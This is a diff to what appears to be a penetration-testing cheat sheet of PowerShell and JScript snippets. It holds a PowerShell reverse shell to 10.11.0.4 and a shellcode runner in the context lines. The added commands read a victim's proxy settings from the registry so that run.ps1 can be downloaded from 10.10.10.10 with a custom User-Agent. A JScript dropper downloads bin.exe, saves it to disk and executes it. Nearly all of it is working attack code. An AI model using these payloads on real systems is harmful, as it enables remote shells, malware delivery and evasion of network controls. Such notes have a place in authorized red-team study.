@@ -88,6 +88,48 @@ Powershell only:
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
+# Show Proxy Settings with Powershell
+```
+[System.Net.WebRequest]::DefaultWebProxy.GetProxy("https://google.com")
+[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://10.10.10.10/run.ps1")
+```
+
+You can also find it in the registry (name: ProxySever)
+```
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings
+```
+
+```
+$keys = Get-ChildItem 'HKU:\'
+ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
+$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
+```
+
+# Set Proxy with Powershell 
+```
+$wc = new-object system.net.webclient
+$wc.proxy = $null
+$wc.DownloadSTring("http://10.10.10.10/run.ps1")
+```
+Get a users proxy settings and set it likewise
+```
+New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
+$keys = Get-ChildItem 'HKU:\'
+ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
+$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
+[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
+$wc = new-object system.net.WebClient
+$wc.DownloadString("http://10.10.10.10/run.ps1")
+```
+
+# Set User-Agent with Powershell
+```
+$wc = new-object system.net.webclient
+$wc.Headers.Add('User-Agent', 'MyUserAgent')
+$wc.DownloadString("http://10.10.10.10/run.ps1")
+```
+
+
 # Privilege Escalation
 ## Switch to high integrity level
 ```
@@ -1236,6 +1278,30 @@ $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
 
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+```
+
+# Dropper in JScript
+```
+var url = "http://10.10.10.10/bin.exe"
+var Object = WScript.CreateObject('MSXML2.XMLHTTP');
+
+Object.Open('GET', url, false);
+Object.Send();
+
+if (Object.Status == 200)
+{
+    var Stream = WScript.CreateObject('ADODB.Stream');
+
+    Stream.Open();
+    Stream.Type = 1;
+    Stream.Write(Object.ResponseBody);
+    Stream.Position = 0;
+
+    Stream.SaveToFile("bin.exe", 2);
+    Stream.Close();
+}
+
+var r = new ActiveXObject("WScript.Shell").Run("bin.exe");
 ```
 
 
